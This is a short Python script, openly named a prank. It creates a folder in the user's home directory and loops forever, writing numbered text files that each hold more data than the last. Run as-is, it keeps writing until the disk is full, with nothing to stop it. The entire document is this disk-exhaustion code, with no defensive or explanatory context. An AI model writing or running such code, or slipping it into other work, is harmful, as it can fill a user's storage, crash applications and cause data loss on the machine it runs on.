import os,shutil

from pathlib import Path

home_dir = Path.home()
made_dir= os.mkdir(home_dir / "prank")
status = 0
while True:
    with open(home_dir / "prank" / f"{status}.txt","w") as file:
        file.write(f"{status}\n"*status)
    status += 1
    continue    
